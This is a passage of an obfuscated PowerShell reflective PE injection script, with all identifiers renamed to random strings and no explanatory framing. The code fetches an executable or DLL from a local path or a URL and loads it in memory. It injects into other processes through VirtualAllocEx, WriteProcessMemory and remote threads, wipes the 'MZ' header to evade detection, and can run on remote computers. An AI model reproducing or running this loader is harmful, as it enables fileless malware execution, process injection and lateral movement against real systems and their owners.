				$vvyFxbJw = $gxNuhWuM.VirtualAllocEx.Invoke($ecUUHIyn, [IntPtr]::Zero, [UIntPtr][UInt64]$FhfbCDRv, $xKjVQlKx.MEM_COMMIT -bor $xKjVQlKx.MEM_RESERVE, $xKjVQlKx.PAGE_EXECUTE_READWRITE)
				if ($vvyFxbJw -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				$UYYLFWoE = $gxNuhWuM.WriteProcessMemory.Invoke($ecUUHIyn, $vvyFxbJw, $gKkRrEWcOriginal, [UIntPtr][UInt64]$FhfbCDRv, [Ref]$oukMtmgo)
				if (($UYYLFWoE -eq $WCARTiiv) -or ([UInt64]$oukMtmgo -ne [UInt64]$FhfbCDRv))
				{
					Throw "Unable to write shellcode to remote process memory."
				}
				$NEspbwgz = FYISLKhm -ProcessHandle $ecUUHIyn -StartAddress $vvyFxbJw -Win32Functions $gxNuhWuM
				$mGWEuovT = $gxNuhWuM.WaitForSingleObject.Invoke($NEspbwgz, 20000)
				if ($mGWEuovT -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				$gxNuhWuM.VirtualFreeEx.Invoke($ecUUHIyn, $vvyFxbJw, [UIntPtr][UInt64]0, $xKjVQlKx.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($brIcZJPz.FileType -ieq "EXE")
		{
			[IntPtr]$Trtreuxz = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($Trtreuxz, 0, 0x00)
			$EVtRJnAD = WvoNPPfl -PEInfo $brIcZJPz -Win32Functions $gxNuhWuM -Win32Constants $xKjVQlKx -ExeArguments $mvGmwgqS -ExeDoneBytePtr $Trtreuxz
			[IntPtr]$wYyoUTyA = XcvoUanJ ($brIcZJPz.PEHandle) ($brIcZJPz.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE oeofTvpw function. Address: $(rbMuqydu $wYyoUTyA). Creating thread for the EXE to run in."
			$gxNuhWuM.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $wYyoUTyA, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($rvAMLFnZ)
			{
				[Byte]$UTraWlcu = [System.Runtime.InteropServices.Marshal]::ReadByte($Trtreuxz, 0)
				if ($UTraWlcu -eq 1)
				{
					nJzZpzXJ -CopyInfo $EVtRJnAD -Win32Functions $gxNuhWuM -Win32Constants $xKjVQlKx
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		return @($brIcZJPz.PEHandle, $mwuohHkv)
	}
	Function HUGrNZyK
	{
		Param(
		[Parameter(Position=0, Mandatory=$rvAMLFnZ)]
		[IntPtr]
		$QuNkENTk
		)
		$xKjVQlKx = KuaRSZmc
		$gxNuhWuM = KoDoDYXx
		$stADljpQ = WLBtrRfq
		$brIcZJPz = TBNBnYHB -PEHandle $QuNkENTk -Win32Types $stADljpQ -Win32Constants $xKjVQlKx
		if ($brIcZJPz.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$fUqopOrn = XcvoUanJ ([Int64]$brIcZJPz.PEHandle) ([Int64]$brIcZJPz.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($rvAMLFnZ)
			{
				$HAsfCErN = [System.Runtime.InteropServices.Marshal]::PtrToStructure($fUqopOrn, [Type]$stADljpQ.IMAGE_IMPORT_DESCRIPTOR)
				if ($HAsfCErN.Characteristics -eq 0 `
						-and $HAsfCErN.FirstThunk -eq 0 `
						-and $HAsfCErN.ForwarderChain -eq 0 `
						-and $HAsfCErN.Name -eq 0 `
						-and $HAsfCErN.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}
				$VDLogaVk = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((XcvoUanJ ([Int64]$brIcZJPz.PEHandle) ([Int64]$HAsfCErN.Name)))
				$TbMEnoSC = $gxNuhWuM.GetModuleHandle.Invoke($VDLogaVk)
				if ($TbMEnoSC -eq $buwbSEkt)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $VDLogaVk. Continuing anyways" -WarningAction Continue
				}
				$UYYLFWoE = $gxNuhWuM.FreeLibrary.Invoke($TbMEnoSC)
				if ($UYYLFWoE -eq $WCARTiiv)
				{
					Write-Warning "Unable to free library: $VDLogaVk. Continuing anyways." -WarningAction Continue
				}
				$fUqopOrn = XcvoUanJ ($fUqopOrn) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$stADljpQ.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$WpQNGrWcoeofTvpwPtr = XcvoUanJ ($brIcZJPz.PEHandle) ($brIcZJPz.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$WpQNGrWcoeofTvpwDelegate = OThsxKhu @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$WpQNGrWcoeofTvpw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WpQNGrWcoeofTvpwPtr, $WpQNGrWcoeofTvpwDelegate)
		$WpQNGrWcoeofTvpw.Invoke($brIcZJPz.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		$UYYLFWoE = $gxNuhWuM.VirtualFree.Invoke($QuNkENTk, [UInt64]0, $xKjVQlKx.MEM_RELEASE)
		if ($UYYLFWoE -eq $WCARTiiv)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}
	Function oeofTvpw
	{
		$gxNuhWuM = KoDoDYXx
		$stADljpQ = WLBtrRfq
		$xKjVQlKx =  KuaRSZmc
		$ecUUHIyn = [IntPtr]::Zero
		if (($TeCGwkPU -ne $buwbSEkt) -and ($TeCGwkPU -ne 0) -and ($WzJAlPZi -ne $buwbSEkt) -and ($WzJAlPZi -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($WzJAlPZi -ne $buwbSEkt -and $WzJAlPZi -ne "")
		{
			$sllZYsgc = @(Get-Process -Name $WzJAlPZi -ErrorAction SilentlyContinue)
			if ($sllZYsgc.Count -eq 0)
			{
				Throw "Can't find process $WzJAlPZi"
			}
			elseif ($sllZYsgc.Count -gt 1)
			{
				$MFBVNLRY = Get-Process | where { $_.Name -eq $WzJAlPZi } | Select-Object ProcessName, Id, SessionId
				Write-Output $MFBVNLRY
				Throw "More than one instance of $WzJAlPZi found, please specify the process ID to inject in to."
			}
			else
			{
				$TeCGwkPU = $sllZYsgc[0].ID
			}
		}
		if (($TeCGwkPU -ne $buwbSEkt) -and ($TeCGwkPU -ne 0))
		{
			$ecUUHIyn = $gxNuhWuM.OpenProcess.Invoke(0x001F0FFF, $WCARTiiv, $TeCGwkPU)
			if ($ecUUHIyn -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $TeCGwkPU"
			}
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		Write-Verbose "Calling MwrGtgXJ"
		$QuNkENTk = [IntPtr]::Zero
		if ($ecUUHIyn -eq [IntPtr]::Zero)
		{
			$QNxdTpdl = MwrGtgXJ -PEBytes $YyOqIfFM -ExeArgs $mvGmwgqS -ForceASLR $XEIOQxss
		}
		else
		{
			$QNxdTpdl = MwrGtgXJ -PEBytes $YyOqIfFM -ExeArgs $mvGmwgqS -RemoteProcHandle $ecUUHIyn -ForceASLR $XEIOQxss
		}
		if ($QNxdTpdl -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		$QuNkENTk = $QNxdTpdl[0]
		$dtMQOOgY = $QNxdTpdl[1] 
		$brIcZJPz = TBNBnYHB -PEHandle $QuNkENTk -Win32Types $stADljpQ -Win32Constants $xKjVQlKx
		if (($brIcZJPz.FileType -ieq "DLL") -and ($ecUUHIyn -eq [IntPtr]::Zero))
		{
	        switch ($fScaqsXf)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$KzfJsBzP = jJHaPlNS -PEHandle $QuNkENTk -FunctionName "WStringFunc"
				    if ($KzfJsBzP -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $DtPSAljw = OThsxKhu @() ([IntPtr])
				    $ZKFWfdTY = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($KzfJsBzP, $DtPSAljw)
				    [IntPtr]$xLuThhIy = $ZKFWfdTY.Invoke()
				    $ABsrxAmB = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($xLuThhIy)
				    Write-Output $ABsrxAmB
	            }
	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$BOyVArdP = jJHaPlNS -PEHandle $QuNkENTk -FunctionName "StringFunc"
				    if ($BOyVArdP -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $XUrSWzHh = OThsxKhu @() ([IntPtr])
				    $bfjaFnvV = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BOyVArdP, $XUrSWzHh)
				    [IntPtr]$xLuThhIy = $bfjaFnvV.Invoke()
				    $ABsrxAmB = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($xLuThhIy)
				    Write-Output $ABsrxAmB
	            }
	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$YqtKFhnC = jJHaPlNS -PEHandle $QuNkENTk -FunctionName "VoidFunc"
				    if ($YqtKFhnC -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $wkpUieCs = OThsxKhu @() ([Void])
				    $EQdQriMj = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($YqtKFhnC, $wkpUieCs)
				    $EQdQriMj.Invoke() | Out-Null
	            }
	        }
		}
		elseif (($brIcZJPz.FileType -ieq "DLL") -and ($ecUUHIyn -ne [IntPtr]::Zero))
		{
			$YqtKFhnC = jJHaPlNS -PEHandle $QuNkENTk -FunctionName "VoidFunc"
			if (($YqtKFhnC -eq $buwbSEkt) -or ($YqtKFhnC -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			$YqtKFhnC = MSysmFEP $YqtKFhnC $QuNkENTk
			$YqtKFhnC = XcvoUanJ $YqtKFhnC $dtMQOOgY
			$NEspbwgz = FYISLKhm -ProcessHandle $ecUUHIyn -StartAddress $YqtKFhnC -Win32Functions $gxNuhWuM
		}
		if ($ecUUHIyn -eq [IntPtr]::Zero -and $brIcZJPz.FileType -ieq "DLL")
		{
			HUGrNZyK -PEHandle $QuNkENTk
		}
		else
		{
			$UYYLFWoE = $gxNuhWuM.VirtualFree.Invoke($QuNkENTk, [UInt64]0, $xKjVQlKx.MEM_RELEASE)
			if ($UYYLFWoE -eq $WCARTiiv)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		Write-Verbose "Done!"
	}
	oeofTvpw
}
Function oeofTvpw
{
	if (($StSHJwXa.MyInvocation.BoundParameters["Debug"] -ne $buwbSEkt) -and $StSHJwXa.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$rzJRuwSj  = "Continue"
	}
	Write-Verbose "PowerShell ProcessID: $QkBaoTLy
	if ($YxeVtHnK.ParameterSetName -ieq "LocalFile")
	{
		Get-ChildItem $CyrgxSuh -ErrorAction Stop | Out-Null
		[Byte[]]$YyOqIfFM = [System.IO.File]::ReadAllBytes((Resolve-Path $CyrgxSuh))
	}
	elseif ($YxeVtHnK.ParameterSetName -ieq "WebFile")
	{
		$WeOrlYJI = New-Object System.Net.WebClient
		[Byte[]]$YyOqIfFM = $WeOrlYJI.DownloadData($SOscxAqq)
	}
	$TWcKEcuc = ($YyOqIfFM[0..1] | % {[Char] $_}) -join ''
    if ($TWcKEcuc -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }
    $YyOqIfFM[0] = 0
    $YyOqIfFM[1] = 0
	if ($mvGmwgqS -ne $buwbSEkt -and $mvGmwgqS -ne '')
	{
		$mvGmwgqS = "ReflectiveExe $mvGmwgqS"
	}
	else
	{
		$mvGmwgqS = "ReflectiveExe"
	}
	if ($ytClMfOm -eq $buwbSEkt -or $ytClMfOm -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $MIuxbfui -ArgumentList @($YyOqIfFM, $fScaqsXf, $TeCGwkPU, $WzJAlPZi,$XEIOQxss)
	}
	else
	{
		Invoke-Command -ScriptBlock $MIuxbfui -ArgumentList @($YyOqIfFM, $fScaqsXf, $TeCGwkPU, $WzJAlPZi,$XEIOQxss) -ComputerName $ytClMfOm
	}
}
oeofTvpw
}
None
